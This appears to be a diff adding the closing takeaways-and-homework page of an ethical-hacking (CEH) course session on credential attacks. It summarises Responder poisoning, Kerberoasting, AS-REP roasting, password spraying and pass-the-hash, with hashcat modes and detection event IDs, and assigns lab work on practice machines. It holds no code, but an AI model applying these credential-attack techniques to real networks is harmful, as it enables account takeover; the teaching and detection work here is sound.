+      </div>
+    </div>
+  </section>
+
+  <!-- ==========  P29 · TAKEAWAYS + HOMEWORK  ========== -->
+  <section class="page" data-title="Takeaways &amp; homework">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P29</span><span class="tag theory">Wrap-up</span><span class="time">⏱ 4 min</span></div>
+      <h1>Takeaways &amp; Homework</h1>
+      <p class="lede">You turned an enumerated network into working credentials against a real domain — and caught
+         yourself doing it.</p>
+    </div>
+    <div class="content">
+
+      <ul class="takeaways">
+        <li><strong>Attackers log in.</strong> A missing patch, a reused password, a weak service account, a workstation that trusts a broadcast — each hands you a credential or a known exploit. You rarely "break" anything.</li>
+        <li><strong>A hash is guessed, not reversed.</strong> One-way, no key. Weak passwords fall because they're in the wordlist; strong ones don't because they aren't.</li>
+        <li><strong>Know what crosses the wire.</strong> NetNTLMv2 (Responder, -m 5600) is not the NT hash (SAM, -m 1000). Wrong mode, wasted hour.</li>
+        <li><strong>Kerberos leaks in two places.</strong> AS-REP roast (no pre-auth, -m 18200) and Kerberoast (any user, -m 13100) — both need only a low-priv account.</li>
+        <li><strong>Spraying beats brute-force.</strong> One password, many accounts, under the lockout threshold. It only takes one reused password in the whole org.</li>
+        <li><strong>You don't always crack.</strong> Pass-the-hash: the NT hash <em>is</em> the credential.</li>
+        <li><strong>Every credential attack is loud.</strong> 4625 (spray), 4769/0x17 (Kerberoast), a poisoned broadcast — and you wrote the rule that catches them. That detection half is the job.</li>
+        <li><strong>Verify the tool is still alive.</strong> Nessus Essentials is 5 IPs now (not 16); LLMNR is still on by default in 2026; Impacket is Fortra's. Check before you quote.</li>
+      </ul>
+
+      <div class="box key-takeaway">
+        <span class="box-t">Homework — due before Session 5</span>
+        <p><strong>1 · Finish the access plan</strong> (Lab 8) for all four hosts — confirmed vulns (CVE + CVSS +
+           public-exploit answer), credentials with their method, one chosen way in each, detection rule attached. This
+           is Session 5's input; arrive without it and you'll build it while everyone else exploits.</p>
+        <p><strong>2 · One-page credential report:</strong> from your own Labs 4–6, show one cracked hash, one spray hit,
+           and one roasted ticket, and for each write the Event ID a SOC would see.</p>
+        <p><strong>3 · Practice (free):</strong> complete <strong>Vulnerabilities 101</strong> and <strong>Attacktive
+           Directory</strong>. Bring one thing each taught you that this session didn't.</p>
+        <p><strong>4 · Practice range (local):</strong> spray <strong>Metasploitable 3</strong>'s Star Wars accounts and
+           crack at least two, using <strong>Stapler 1</strong>'s enum4linux dump as your spray list.</p>
+        <p><strong>5 · Stretch (optional):</strong> extend your Lab 7 rule so it also catches a <em>slow</em> spray (a long
+           wait between rounds), and write one sentence on the false-positive cost.</p>
+      </div>
+
+      <div class="box soc">
+        <span class="box-t">One last thing</span>
+        <p>You attacked a domain and detected the attack in the same afternoon, on the same events. Authentication is the
+           surface every attacker goes for and every SOC watches hardest — and you just worked both sides of it. Bring
+           your access plan to Session 5. It's time to turn the key.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==========  NAV  ========== -->
+  <div class="pagenav">
+    <a href="#" id="btnPrev"><small>Previous</small><span class="lbl">—</span></a>
+    <a href="#" id="btnNext" class="next"><small>Next</small><span class="lbl">—</span></a>
+  </div>
+  <p class="kbd-hint">Navigate with <span class="kbd">←</span> <span class="kbd">→</span> arrow keys ·
+     <span class="kbd">Home</span> / <span class="kbd">End</span> to jump</p>
+
+  </article>
+</div>
+</div>
+
+<footer class="footer">
+  <div class="wrap footer-inner">
+    <span>ITGate Academy · CEH Diploma · Session 04</span>
+    <span class="mono">Primary reference: EC-Council CEH 312-50 · Modules 5 &amp; 6 (pt1)</span>
+  </div>
+</footer>
+
+<script src="../assets/js/session.js"></script>
+</body>
+</html>
